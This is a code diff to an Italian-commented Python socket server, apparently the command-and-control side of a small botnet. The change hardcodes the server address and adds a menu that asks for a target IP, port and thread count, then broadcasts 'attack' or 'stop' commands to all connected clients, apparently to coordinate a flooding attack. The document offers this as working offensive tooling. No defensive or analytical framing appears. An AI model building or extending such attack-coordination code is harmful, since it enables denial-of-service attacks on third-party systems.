@@ -1,5 +1,6 @@
-import socket
 import threading
+import socket
+import os
 
 # Funzione per gestire la connessione di un singolo client
 def handle_client(client_socket, address):
@@ -23,11 +24,14 @@ def handle_client(client_socket, address):
 
 # Funzione per inviare un messaggio a tutti i client connessi
 def send_message_to_clients(message):
-    for client in clients:
-        try:
-            client.send(message.encode('utf-8'))
-        except Exception as e:
-            print("Errore durante l'invio del messaggio:", e)
+    if clients:
+        for client, _ in clients:
+            try:
+                client.send(message.encode('utf-8'))
+            except Exception as e:
+                print("Errore durante l'invio del messaggio:", e)
+    else:
+        print("Nessun client connesso.")
 
 # Funzione per avviare il server
 def start_server(ip, port, threads):
@@ -99,6 +103,9 @@ def stop_server():
     server_running = False
     print("Server fermato.")
 
+def clear():
+    os.system("clear")
+
 # Funzione principale del server
 def main():
     while True:
@@ -110,16 +117,29 @@ def main():
 
         choice = input("Seleziona un'opzione: ")
 
+        clear()
         if choice == '1':
-            ip = input("Inserisci l'indirizzo IP del server: ")
-            port = int(input("Inserisci il numero di porta del server: "))
-            threads = int(input("Inserisci il numero di thread per gestire i client: "))
-            start_server(ip, port, threads)
+            start_server("10.0.0.100", 20000, 10)
         elif choice == '2':
             stop_server()
         elif choice == '3':
-            message = input("Inserisci il messaggio da inviare ai client: ")
-            send_message_to_clients(message)
+            while True:
+                message = ""
+                message_type = input("Tipo di messaggio (attacco o stop): ")
+                clear()
+                if message_type == "attacco":
+                    ip = input("IP da attaccare: ")
+                    porta = input("Porta da attaccare: ")
+                    threads = input("Numero di thread: ")
+                    message = f"attack {ip} {porta} {threads}"
+                    send_message_to_clients(message)
+                    break
+                elif message_type == "stop":
+                    message = "stop"
+                    send_message_to_clients(message)
+                    break
+                else:
+                    print("Tipo di messaggio non valido.")
         elif choice == '4':
             stop_server()
             break
